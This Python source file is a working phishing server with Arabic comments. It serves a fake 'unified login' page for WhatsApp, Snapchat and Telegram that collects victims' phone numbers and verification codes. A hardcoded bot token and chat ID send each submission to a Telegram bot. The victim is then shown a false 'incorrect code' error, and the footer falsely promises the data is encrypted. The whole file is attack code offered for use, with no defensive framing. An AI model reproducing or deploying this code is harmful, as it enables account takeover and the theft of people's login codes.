from http.server import HTTPServer, BaseHTTPRequestHandler
import os
import urllib.parse
import requests

# ===== إعدادات البوت =====
BOT_TOKEN = "8875360747:AAHZH8ti8BTzA8_Gzo6QV6ex4OsaJyoBovI"
CHAT_ID = "1170411845"

# ===== دالة الإرسال للبوت =====
def send_to_telegram(service, phone, code):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = f"✅ [{service}]\n📱 الهاتف: {phone}\n🔑 الرمز: {code}"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": message}, timeout=10)
    except:
        pass

# ===== خادم الفيشينج =====
class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.end_headers()
            html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول الموحد</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #1a1a1a;
            padding: 40px 35px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            width: 100%;
            max-width: 420px;
            border: 1px solid #333;
        }
        .logo {
            text-align: center;
            font-size: 48px;
            margin-bottom: 10px;
        }
        .title {
            color: #ffffff;
            text-align: center;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 6px;
        }
        .subtitle {
            color: #aaaaaa;
            text-align: center;
            font-size: 14px;
            margin-bottom: 28px;
        }
        .service-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 25px;
            justify-content: center;
        }
        .service-tab {
            background: #2a2a2a;
            color: #ccc;
            border: none;
            padding: 10px 18px;
            border-radius: 30px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
        }
        .service-tab.active {
            background: #25D366;
            color: #000;
        }
        .service-tab.wa.active { background: #25D366; }
        .service-tab.sn.active { background: #FFFC00; color: #000; }
        .service-tab.tg.active { background: #0088cc; }

        .input-group {
            margin-bottom: 16px;
        }
        .input-group label {
            color: #ccc;
            font-size: 13px;
            font-weight: 500;
            display: block;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: #2a2a2a;
            border: 1px solid #3a3a3a;
            border-radius: 12px;
            color: #fff;
            font-size: 15px;
            transition: 0.3s;
        }
        .input-group input:focus {
            outline: none;
            border-color: #25D366;
            background: #1f1f1f;
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: #25D366;
            color: #000;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 8px;
        }
        .btn-login:hover {
            transform: scale(1.02);
            filter: brightness(1.1);
        }
        .footer {
            text-align: center;
            color: #666;
            font-size: 12px;
            margin-top: 20px;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">🌐</div>
    <div class="title">تسجيل الدخول الموحد</div>
    <div class="subtitle">اختر الخدمة وأدخل بياناتك</div>

    <div class="service-tabs">
        <button class="service-tab wa active" onclick="setService('wa', 'واتساب')">📱 واتساب</button>
        <button class="service-tab sn" onclick="setService('sn', 'سناب شات')">👻 سناب</button>
        <button class="service-tab tg" onclick="setService('tg', 'تيليجرام')">✈️ تليجرام</button>
    </div>

    <form action="/login" method="POST">
        <input type="hidden" name="service" id="serviceInput" value="wa">
        <div class="input-group">
            <label>رقم الهاتف / البريد الإلكتروني</label>
            <input type="text" name="phone" placeholder="أدخل رقم الهاتف" required>
        </div>
        <div class="input-group">
            <label>رمز التحقق</label>
            <input type="text" name="code" placeholder="أدخل رمز التحقق" required>
        </div>
        <button type="submit" class="btn-login">تسجيل الدخول</button>
    </form>
    <div class="footer">🔒 جميع البيانات مشفرة وآمنة</div>
</div>
<script>
    function setService(id, name) {
        document.querySelectorAll('.service-tab').forEach(t => t.classList.remove('active'));
        document.querySelector(`.service-tab.${id}`).classList.add('active');
        document.getElementById('serviceInput').value = id;
    }
</script>
</body>
</html>"""
            self.wfile.write(html.encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == "/login":
            length = int(self.headers["Content-Length"])
            raw = self.rfile.read(length).decode()
            data = urllib.parse.parse_qs(raw)
            service = data.get("service", ["wa"])[0]
            phone = data.get("phone", [""])[0]
            code = data.get("code", [""])[0]

            # ترجمة اسم الخدمة للعربية
            names = {"wa": "واتساب", "sn": "سناب شات", "tg": "تيليجرام"}
            send_to_telegram(names.get(service, service), phone, code)

            self.send_response(200)
            self.end_headers()
            self.wfile.write("""
                <h3 style="color:#ff6b6b;text-align:center;margin-top:50px;font-family:sans-serif;">
                    ⚠️ رمز التحقق غير صحيح، حاول مجدداً
                </h3>
            """.encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        return

# ===== تشغيل الخادم =====
def run_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), PhishingHandler)
    print(f"[✓] خادم الفيشينج المتكامل يعمل على المنفذ {port}")
    server.serve_forever()

if __name__ == "__main__":
    run_server()
